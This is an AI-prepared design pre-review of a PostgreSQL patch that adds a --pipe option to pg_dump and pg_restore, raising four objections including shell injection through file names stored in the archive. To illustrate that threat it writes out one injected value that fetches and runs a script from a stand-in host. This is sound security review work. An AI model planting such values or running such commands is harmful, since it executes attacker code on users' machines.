# Design pre-review: Adding pg_dump flag for parallel export to pipes

> Prepared by an AI harness; treat as a devil's advocate, not a verdict.

[CommitFest 5893](https://commitfest.postgresql.org/patch/5893/); [thread](https://www.postgresql.org/message-id/flat/CAH5HC97p4kkpikar%2BswuC0Lx4YTVkE30sTsFX94tyzih7Cc_%3Dw%40mail.gmail.com), 31 of 31 messages read; no code read.

## Verdict

**NEEDS-COMMITTER-EYES** (confidence: medium). The goal is clear and several independent participants asked for it, so levels 1a and 1b pass. Four fixable design objections survived at level 2. The decisive one is security-1: pg_restore --pipe puts file names read from the archive into a shell command without validation. standards-compat-2, maintenance-fit-1 and maintenance-fit-4 are smaller. None of them requires a different proposal.

Not checked: Without the code, this review could not confirm whether pg_restore checks archive file names before substitution, or whether any path opens a blob TOC file twice. Only 3 of 31 messages were read in full, so later messages may already answer some of these points.

## Prior attempts

None found before 2025-04-07.

## Objections a reviewer is likely to raise

### 1. pg_restore --pipe passes archive-supplied file names to the shell

A user runs pg_restore --pipe="cat dumpdir/%f" on a directory dump from a vendor, a bug report or a shared bucket. Someone has edited toc.dat or blob_NNN.toc so that one stored file name is `x; curl evil | sh`. pg_restore puts that text into the command and runs it with popen, and the user finds out only after the shell has run it.

In directory format, pg_restore reads each data file name back from toc.dat, and each large object file name from the blob TOC file. So with --pipe, the %f values come from the archive, not from pg_restore. Message #19 added shell escaping, and message #20 removed it because the command runs on the client. Today a tampered archive can at most make pg_restore open an unexpected path, but with --pipe it can run a shell command as the restoring user, and recent work on pg_dump and psql treats an untrusted dump or server as a real threat.

**Question:** How does pg_restore --pipe make sure a file name read from toc.dat or a blob TOC file cannot inject shell syntax, for example by checking it against the expected name pattern before substitution?

<sub>fixable, level 2, security / privileges; messages [#19](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com), [#20](https://www.postgresql.org/message-id/CAH5HC95hD0tS2FKi8B6%3Do4g_Pf9WWbg8ZfD0Mu3m-h7ecfiK8A%40mail.gmail.com); `security-1`</sub>

### 2. Shell contract for --pipe is undefined on Windows

A Windows user copies a documented example such as --pipe="cat > dumpdir/%f". popen hands the command to cmd.exe, which has different quoting and tools, so the command fails or writes to the wrong place. The user finds out when the dump errors or the files are missing.

Message #31 skips all pipe tests on Windows because command parsing keeps failing, and message #20 removed shell escaping for the same reason. The documentation gives only POSIX shell examples and does not say which shell runs the command or how %f is quoted. A user-facing option whose meaning differs by platform, with no tests on one of them, leaves that platform without a defined contract.

**Question:** Which shell runs the --pipe command on Windows, how is a %f file name quoted there, and what test shows that it works?

<sub>fixable, level 2, design; messages [#19](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com), [#20](https://www.postgresql.org/message-id/CAH5HC95hD0tS2FKi8B6%3Do4g_Pf9WWbg8ZfD0Mu3m-h7ecfiK8A%40mail.gmail.com), [#30](https://www.postgresql.org/message-id/CAH5HC971uOCgqrmjcu0XDqdAeQ4tw5hAbtpzr82D%3DV5RW7Yfyw%40mail.gmail.com), [#31](https://www.postgresql.org/message-id/CAH5HC96vrSWqTkiyN-ZU55mt90Tp4iUWz8bm8MYLcXEr-h8p-A%40mail.gmail.com); `standards-compat-2`</sub>

### 3. Overloading the file name field with a pipe command invites silent misuse

A later patch adds a code path in pg_restore or pg_dumpall that uses the archive file spec as a path and does not check the pipe flag. The user's shell command is then opened as a file name. The user sees a confusing "could not open" error, or the wrong file is read.

The patch stores the command in the existing file name variables and adds a bool next to them (message #1). Message #16 shows this has already happened twice. restore_global_objects needed the new flag added, and pg_restore --format=tar opened "cat" as a TOC file. pg_dumpall directory mode is left out (message #19), so the next patch that adds it has to find every such place by hand.

**Question:** Can the pipe command get its own field or type, so that code which treats it as a path fails to compile or fails a check?

<sub>fixable, level 2, maintenance burden ("who maintains this in 10 years"); messages [#1](https://www.postgresql.org/message-id/CAH5HC97p4kkpikar%2BswuC0Lx4YTVkE30sTsFX94tyzih7Cc_%3Dw%40mail.gmail.com), [#16](https://www.postgresql.org/message-id/CAKYtNApb_aL%3DpsF%2B%3DVwjppTd717F4dGk_MVG9XW06OOW8LHRUQ%40mail.gmail.com), [#19](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com); `maintenance-fit-1`</sub>

### 4. Large object TOC mode change for all users bundled into feature

A user who never uses --pipe dumps a database whose large objects span several archive entries. If any path opens the same blob TOC file twice, the change from 'ab' to 'w' truncates it. The user finds out when the restore of large objects fails.

Message #1 left 'w' mode limited to pipe mode because the 'ab' code "has been there since the start". Message #19 then made it unconditional, with "If there is a concern, we can revert". The change affects every directory-format dump, and the only support offered is a reading of the call order of _StartLOs. As one hunk inside a 38 KB feature commit, it cannot be reviewed or reverted on its own.

**Question:** Can the 'ab' to 'w' change go in as a separate first commit, with a test showing that no path opens a blob TOC file twice?

<sub>fixable, level 2, design; messages [#1](https://www.postgresql.org/message-id/CAH5HC97p4kkpikar%2BswuC0Lx4YTVkE30sTsFX94tyzih7Cc_%3Dw%40mail.gmail.com), [#19](https://www.postgresql.org/message-id/CAH5HC97skKgTkOBUipZjpOCXYc27txdzFL8UmVmBKaRvc4LO5A%40mail.gmail.com); `maintenance-fit-4`</sub>

## Questions for the author

1. How does pg_restore --pipe stop a file name read from toc.dat or a blob TOC file from injecting shell syntax into the command?
2. Does --pipe work on Windows, and if it does not, will pg_dump and pg_restore reject the option there instead of skipping the tests?
3. Can the pipe command have its own field or type, so that code which treats it as a path fails a check instead of opening the command as a file?
4. Can the 'ab' to 'w' change for the large object TOC file be a separate first commit with a test for large objects split over several entries with -j?
5. When one pipe command fails part way through a parallel dump, what does pg_dump report, and what happens to the output already written by the other commands?

## Touch points

- **pg_dump / restore round-trip:** Directory archives are written and read through user commands, and the large object TOC file open mode changes for every directory dump.
- **security / privileges:** pg_restore --pipe substitutes file names read from toc.dat and blob TOC files into a command run with popen.
- **backpatchability:** The CommitFest entry sets target version to stable, but a new option can go to master only.
- **maintenance burden ("who maintains this in 10 years"):** A per-file popen path in pg_dump and pg_restore, a command stored in the file name field, and no Windows tests.

## Who would commit it, and when

- Owner: silent. Someone who knows the pg_dump archive formats and the parallel dump code, and who can judge command execution on Windows.
- Priority: fix design first; audience a sizeable minority; review cost medium. Users of parallel dumps on large databases gain streaming without staging the full dump on local disk, and reviewers found the idea useful. The v21 core patch is about 38 KB across 17 files in src/bin/pg_dump. The file name validation and the Windows behaviour need answers before a committer can take it.

---

[roast-full.md](roast-full.md) has 0 more objection(s) that held, 5 refuted, the proposal restated, all 15 touch points, run details.

Prepared by an AI harness; treat as a devil's advocate, not a verdict.
